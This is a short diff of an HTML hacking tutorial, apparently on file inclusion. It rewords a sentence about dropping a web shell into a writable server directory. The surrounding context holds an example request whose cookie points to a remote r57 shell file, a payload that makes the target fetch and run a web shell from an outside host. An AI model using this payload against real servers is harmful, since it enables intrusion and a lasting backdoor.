@@ -26,7 +26,7 @@
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;In addition, with a writable directory, we can drop a shell (you can use script-kiddies scripts like &lt;a href="http://www.r57shell.net/"&gt;r57 shell.net&lt;/a&gt;, but in real life, keep in mind that they are super uber &lt;a href="http://thehackerblog.com/hacking-script-kiddies-r57-gen-tr-shells-are-backdoored-in-a-way-you-probably-wouldnt-guess/#more-447"&gt;backdoored&lt;/a&gt;).&lt;/p&gt;
+&lt;p&gt;In addition, with a writable directory we can drop a shell in the server (you can use script-kiddies scripts like &lt;a href="http://www.r57shell.net/"&gt;r57 shell.net&lt;/a&gt;, but in real life, keep in mind that they are super uber &lt;a href="http://thehackerblog.com/hacking-script-kiddies-r57-gen-tr-shells-are-backdoored-in-a-way-you-probably-wouldnt-guess/#more-447"&gt;backdoored&lt;/a&gt;).&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;Post Request: 0=include/myfile.php&lt;/span&gt;
 &lt;span class="err"&gt;Cookie: 0=http://www.r57shell.net/shell/r57.txt&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
